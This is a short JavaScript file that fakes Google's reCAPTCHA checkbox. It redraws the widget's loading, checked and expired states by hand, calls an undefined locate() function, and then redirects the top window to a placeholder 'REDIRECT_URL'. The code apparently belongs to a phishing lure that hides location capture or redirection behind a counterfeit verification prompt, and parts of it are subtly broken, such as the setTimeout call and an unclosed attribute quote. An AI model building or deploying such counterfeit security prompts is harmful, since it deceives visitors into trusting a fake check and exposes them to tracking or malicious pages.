function loading(){
    document.getElementById('recaptcha-anchor').outerHTML='<span role="checkbox" aria-checked="true" id="recaptcha-anchor" dir="ltr" aria-labelledby="recaptcha-anchor-label" aria-disabled="false" tabindex="0" style="" class="recaptcha-checkbox goog-inline-block recaptcha-checkbox-unchecked rc-anchor-checkbox recaptcha-checkbox-loading"><div class="recaptcha-checkbox-border" role="presentation" style="display: none;"></div><div class="recaptcha-checkbox-borderAnimation" role="presentation" style=""></div><div class="recaptcha-checkbox-spinner" role="presentation" style="display: ; animation-play-state: running; opacity: 1;"><div class="recaptcha-checkbox-spinner-overlay" style="animation-play-state: running;"></div></div><div class="recaptcha-checkbox-checkmark" role="presentation" style=""></div></span>';
  }
  function cap_success(){
    document.getElementById('recaptcha-anchor').outerHTML='<span class="recaptcha-checkbox goog-inline-block recaptcha-checkbox-unchecked rc-anchor-checkbox recaptcha-checkbox-checked" role="checkbox" aria-checked="true" id="recaptcha-anchor" dir="ltr" aria-labelledby="recaptcha-anchor-label" aria-disabled="false" tabindex="0" style="overflow: visible;"><div class="recaptcha-checkbox-border" role="presentation" style="display: none;"></div><div class="recaptcha-checkbox-borderAnimation" role="presentation" style=""></div><div class="recaptcha-checkbox-spinner" role="presentation" style="display: none; animation-play-state: running; opacity: 1;"><div class="recaptcha-checkbox-spinner-overlay" style="animation-play-state: running;"></div></div><div class="recaptcha-checkbox-checkmark" role="presentation" style=""></div></span>';
  }
  function cap_uncheck(){
    document.getElementById('recaptcha-anchor').outerHTML='<span class="recaptcha-checkbox goog-inline-block recaptcha-checkbox-unchecked rc-anchor-checkbox" role="checkbox" aria-checked="false" id="recaptcha-anchor" tabindex="0" dir="ltr" aria-labelledby="recaptcha-anchor-label"><div class="recaptcha-checkbox-border" onclick="window.top.location.reload(); role="presentation"></div><div class="recaptcha-checkbox-borderAnimation" role="presentation"></div><div class="recaptcha-checkbox-spinner" role="presentation"><div class="recaptcha-checkbox-spinner-overlay"></div></div><div class="recaptcha-checkbox-checkmark" role="presentation"></div></span>';
  }
  function cap_error(){
    document.getElementById('recaptcha-anchor').outerHTML='<span class="recaptcha-checkbox goog-inline-block recaptcha-checkbox-unchecked rc-anchor-checkbox recaptcha-checkbox-expired" role="checkbox" aria-checked="false" id="recaptcha-anchor" tabindex="0" dir="ltr" aria-labelledby="recaptcha-anchor-label"><div class="recaptcha-checkbox-border" onclick="window.top.location.reload();" role="presentation" style=""></div><div class="recaptcha-checkbox-borderAnimation" role="presentation" style=""></div><div class="recaptcha-checkbox-spinner" role="presentation"><div class="recaptcha-checkbox-spinner-overlay"></div></div><div class="recaptcha-checkbox-checkmark" role="presentation"></div></span>'
  }
  function cap_forward(){
    window.top.location = 'REDIRECT_URL'
  }
  
  function transmit(){
    loading();
    setTimeout(locate(), 2000);
  }
  
  function transmitted(){
    cap_success();
    cap_forward();
  }

  function main(){

  locate(transmitted, cap_error);
  }